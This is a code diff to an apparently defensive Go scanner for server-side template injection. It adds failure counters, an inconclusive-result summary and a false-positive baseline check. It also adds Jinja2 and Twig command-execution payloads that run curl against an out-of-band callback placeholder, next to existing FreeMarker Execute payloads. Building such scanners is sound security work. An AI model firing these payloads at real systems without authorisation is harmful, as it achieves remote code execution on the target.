@@ -7,6 +7,7 @@ import (
 	"net/url"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
@@ -52,6 +53,9 @@ type ServerSideTemplateInjectionSsti struct {
 	Target  string
 	results []ServerSideTemplateInjectionSstiResult
 	OOB     *OOBManager
+
+	attemptedProbes int64
+	failedProbes    int64
 }
 
 // NewServerSideTemplateInjectionSsti creates a new instance.
@@ -75,6 +79,8 @@ func (m *ServerSideTemplateInjectionSsti) SetThreads(count int) {
 func (m *ServerSideTemplateInjectionSsti) Execute(ctx context.Context) ([]ServerSideTemplateInjectionSstiResult, error) {
 	m.Mu.Lock()
 	m.results = make([]ServerSideTemplateInjectionSstiResult, 0)
+	atomic.StoreInt64(&m.attemptedProbes, 0)
+	atomic.StoreInt64(&m.failedProbes, 0)
 	m.Mu.Unlock()
 
 	parsedURL, err := url.Parse(m.Target)
@@ -119,6 +125,8 @@ func (m *ServerSideTemplateInjectionSsti) Execute(ctx context.Context) ([]Server
 			"{{req('%%OOB_URL%%')}}",
 			"${\"freemarker.template.utility.Execute\"?new()(\"curl %%OOB_URL%%\")}",
 			"<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"curl %%OOB_URL%%\") }",
+			"{{ config.__class__.__init__.__globals__['os'].popen('curl %%OOB_URL%%').read() }}",
+			"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"curl %%OOB_URL%%\")}}",
 		}
 		for _, p := range oobPayloads {
 			payloads = append(payloads, SSTIPayload{Type: SSTIOOB, Value: p})
@@ -164,26 +172,52 @@ func (m *ServerSideTemplateInjectionSsti) Execute(ctx context.Context) ([]Server
 
 	select {
 	case <-done:
+		m.appendInconclusiveIfAllProbesFailed()
 		return m.results, nil
 	case <-ctx.Done():
 		<-done
+		m.appendInconclusiveIfAllProbesFailed()
 		return m.results, ctx.Err()
 	}
 }
 
+// appendInconclusiveIfAllProbesFailed emits an inconclusive summary row when
+// every probe ended in a transport/build failure, so an unreachable target is
+// never reported as a clean scan.
+func (m *ServerSideTemplateInjectionSsti) appendInconclusiveIfAllProbesFailed() {
+	m.Mu.Lock()
+	defer m.Mu.Unlock()
+	if m.results == nil || len(m.results) > 0 {
+		return
+	}
+	attempted := atomic.LoadInt64(&m.attemptedProbes)
+	if attempted > 0 && atomic.LoadInt64(&m.failedProbes) >= attempted {
+		m.results = append(m.results, ServerSideTemplateInjectionSstiResult{
+			Target: m.Target,
+			Status: statusFromEvidence(EvidenceWeak, false),
+			Detail: formatEvidenceDetail(EvidenceWeak, "All SSTI probes failed with transport errors or HTTP error responses; target reachability could not be established."),
+		})
+	}
+}
+
 func (m *ServerSideTemplateInjectionSsti) testVector(ctx context.Context, u *url.URL, vector InputVector, payload SSTIPayload, validator *SSTIValidator) {
+	atomic.AddInt64(&m.attemptedProbes, 1)
+
 	var req *http.Request
 	var err error
 
 	if payload.Type == SSTIOOB && m.OOB != nil {
 		oobHost, oobID := m.OOB.GenerateOOBPayload()
-		if oobHost != "" {
-			if !strings.HasPrefix(oobHost, "http://") && !strings.HasPrefix(oobHost, "https://") {
-				oobHost = "http://" + oobHost
-			}
-			payload.Value = strings.ReplaceAll(payload.Value, "%%OOB_URL%%", oobHost)
-			payload.OOBID = oobID
+		if oobHost == "" || oobID == "" {
+			// No resolvable OOB host: the OOB payload cannot be tested at all.
+			atomic.AddInt64(&m.failedProbes, 1)
+			return
 		}
+		if !strings.HasPrefix(oobHost, "http://") && !strings.HasPrefix(oobHost, "https://") {
+			oobHost = "http://" + oobHost
+		}
+		payload.Value = strings.ReplaceAll(payload.Value, "%%OOB_URL%%", oobHost)
+		payload.OOBID = oobID
 	}
 
 	testValue := vector.Value + payload.Value
@@ -195,23 +229,60 @@ func (m *ServerSideTemplateInjectionSsti) testVector(ctx context.Context, u *url
 
 	req, err = m.BaseModule.BuildRequestWithVector(ctx, method, u, vector, testValue)
 	if err != nil || req == nil {
+		atomic.AddInt64(&m.failedProbes, 1)
 		return
 	}
 
 	resp, err := m.Client.Do(req)
 	if err != nil {
+		atomic.AddInt64(&m.failedProbes, 1)
 		return
 	}
 	defer resp.Body.Close()
 
+	// A 4xx/5xx response means the engine rejected the template outright, so it
+	// counts as an unusable probe; judging still proceeds in case the error body
+	// leaks evaluated content (results short-circuit the summary below).
+	if resp.StatusCode >= http.StatusBadRequest {
+		atomic.AddInt64(&m.failedProbes, 1)
+	}
+
 	bodyBytes, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
 	if err != nil {
+		atomic.AddInt64(&m.failedProbes, 1)
 		return
 	}
 	bodyStr := string(bodyBytes)
 
+	// The math judge must not fire when the evaluated result is already present
+	// in an ordinary response of the same vector (IDs, timestamps, plain value
+	// reflection). Re-send the same vector without the template payload and skip
+	// when the baseline body already contains the expected result.
+	if payload.Type == SSTIMath {
+		baseValue := strings.ReplaceAll(testValue, payload.Value, "")
+		baseReq, err := m.BaseModule.BuildRequestWithVector(ctx, method, u, vector, baseValue)
+		if err != nil || baseReq == nil {
+			atomic.AddInt64(&m.failedProbes, 1)
+			return
+		}
+		baseResp, err := m.Client.Do(baseReq)
+		if err != nil {
+			atomic.AddInt64(&m.failedProbes, 1)
+			return
+		}
+		baseBytes, err := ReadBoundedBody(baseResp.Body, MaxResponseBodyBytes)
+		baseResp.Body.Close()
+		if err != nil {
+			atomic.AddInt64(&m.failedProbes, 1)
+			return
+		}
+		if strings.Contains(string(baseBytes), payload.Expected) {
+			return
+		}
+	}
+
 	var oobHits []OOBInteraction
-	if payload.Type == SSTIOOB && m.OOB != nil {
+	if payload.Type == SSTIOOB && m.OOB != nil && payload.OOBID != "" {
 		timeout := time.After(5 * time.Second)
 		ticker := time.NewTicker(500 * time.Millisecond)
 		defer ticker.Stop()
@@ -233,14 +304,15 @@ func (m *ServerSideTemplateInjectionSsti) testVector(ctx context.Context, u *url
 
 	if validator.IsVulnerable(bodyStr, payload, oobHits) {
 		m.Mu.Lock()
-		detail := fmt.Sprintf("SSTI (%s) successful in %s '%s' using payload: %s", payload.Type, vector.Type, vector.Key, payload.Value)
+		summary := fmt.Sprintf("SSTI (%s) successful in %s '%s' using payload: %s", payload.Type, vector.Type, vector.Key, payload.Value)
 		if payload.Type == SSTIMath {
-			detail += " (Result: " + payload.Expected + ")"
+			summary += " (Result: " + payload.Expected + ")"
 		}
+		detail := formatEvidenceDetail(EvidenceConfirmed, summary)
 		m.RecordPoC(req, nil, detail)
 		m.results = append(m.results, ServerSideTemplateInjectionSstiResult{
 			Target: m.Target,
-			Status: "vulnerable",
+			Status: statusFromEvidence(EvidenceConfirmed, false),
 			Detail: detail,
 		})
 		m.Mu.Unlock()
